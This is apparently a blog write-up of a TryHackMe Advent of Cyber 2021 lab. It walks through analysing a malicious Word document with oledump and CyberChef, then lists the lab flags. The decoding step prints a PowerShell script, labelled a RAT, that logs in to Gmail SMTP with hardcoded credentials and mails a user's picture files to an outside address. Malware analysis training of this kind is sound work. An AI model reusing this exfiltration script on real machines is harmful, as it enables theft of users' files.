---
title: Advent Of Cyber 3 - Day 22
date: "2021-12-22"
description: Yara rules
tldr: Yara
tags: [yara,tryhackme,adventofcyber3,blueteam]

---

Time to play around more with cyberchef and extract information from files that The Grinch has been tampering with. 

```shell
C:\Users\Administrator\Desktop\Tools\oledump_V0_0_60>oledump.py C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7211 '1Table'
  5:    204592 'Data'
  6:        97 'Macros/GrinchEnterprisesWasHere/\x01CompObj'
  7:       318 'Macros/GrinchEnterprisesWasHere/\x03VBFrame'
  8:      1650 'Macros/GrinchEnterprisesWasHere/f'
  9:        84 'Macros/GrinchEnterprisesWasHere/o'
 10:       580 'Macros/PROJECT'
 11:       140 'Macros/PROJECTwm'
 12: M    1879 'Macros/VBA/GrinchEnterprisesWasHere'
 13: M     987 'Macros/VBA/Module1'
 14: m     924 'Macros/VBA/ThisDocument'
 15:      3501 'Macros/VBA/_VBA_PROJECT'
 16:       921 'Macros/VBA/dir'
 17:      4096 'WordDocument'
 ```
 
 with 7zip, unpack the word document , check the macros 
 
 in the ´f´ file there's a base64 code: 
 
 ```code ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==
 ```
 
 paste into cyberchef (input) 
 
 recipe: 
 from base64 
 XOR (Key 35, decimal)
 from base64 
 
 get script: 
 ```VBScript
 #Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!

$username="Grinch.Enterprises.2021@gmail.com"
$password="S@ntai$comingt0t0wn"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)


$msg.From = "santaspresentsdelivery@gmail.com"

$msg.To.Add("Grinch.Enterprises.2021@gmail.com")

$msg.Body="Your presents have arrived!"

$msg.Subject = "Christmas Wishlist"

$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"

Foreach($file in $files)
{
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
$attachment.Dispose();
$msg.Dispose();
```


What is the username (email address) : `Grinch.Enterprises.2021@gmail.com`

Mailbox password: `S@ntai$comingt0t0wn`

Subject of the email: `Christmas Wishlist`

port to exfiltrate data from the north pole: `587`

what is the flag hidden found in the document ?
```shell
C:\Users\Administrator\Desktop\Tools\oledump_V0_0_60>oledump.py -s 7 -d C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc

Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
VERSION 5.00
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} GrinchEnterprisesWasHere
   Caption         =   "YouFoundGrinchCookie"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   StartUpPosition =   1  'CenterOwner
   TypeInfoVer     =   4
End
```

the answer is: `YouFoundGrinchCookie`

second flag hidden somewhere , where is it ? 

look around in the filesystem and find: `C:\Users\Administrator\Pictures\Grinch2021`

where there's a picture of santa, elves and raindeers and also a flag 
flag is: `S@nt@c1Au$IsrEAl`

![thm-aoc3-day22](/img/thm-aoc3-day22-1.png)

